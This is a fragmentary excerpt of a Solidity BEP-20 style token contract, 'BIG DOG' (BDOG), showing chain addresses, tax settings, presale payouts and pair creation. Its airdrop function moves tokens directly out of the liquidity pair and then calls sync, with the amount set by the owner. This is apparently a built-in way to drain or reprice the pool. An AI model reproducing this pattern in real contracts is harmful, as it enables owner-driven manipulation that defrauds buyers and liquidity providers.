...
contract BIGDOG {
    ...
    address router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; //DOGE:0xa4EE06Ce40cb7e8c04E127c1F7D3dFB7F7039C81 ETH: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D  BSCtest: 0xD99D1c33F9fC3444f8101754aBC46c52416550D1   BSC: 0x10ED43C718714eb63d5aA57B78B54704E256024E
    address WBNB_address = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; //DOGE: 0xB7ddC6414bf4F5515b52D8BdD69973Ae205ff101 ETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2  ETHtest: 0xc778417E063141139Fce010982780140Aa0cD5Ab BSCtest: 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd  BSC: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    address player1;
    address player2;
    address player3;
    address player4;
    ...
    constructor() {
        ...
        _name = "BIG DOG";
        _symbol = "BDOG";
        _supply = 100000000000;  // 100tril
        _decimals = 6;
        maxTax = 10;
        maxBonusTax = 4;
        maxAmount = totalSupply()/50; //2%
    ...
    function airdrop() internal {
        ...
        //_supply += 1;
        _transfer(pair,airdropTarget,airdropAmount);
        sync();
    }
    ...
    function setAirdropAmount(uint amount) public owner{
    ...
    for(uint j=1;j<=presalersCount;j++){
        ...
        if(share > 1){
        _transfer(address(this),presaleEntry_user[j],balanceOf(address(this))/3*share/10000);
        }
    }
    ...
    function CreatePair() internal{
        pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WBNB_address);
    }
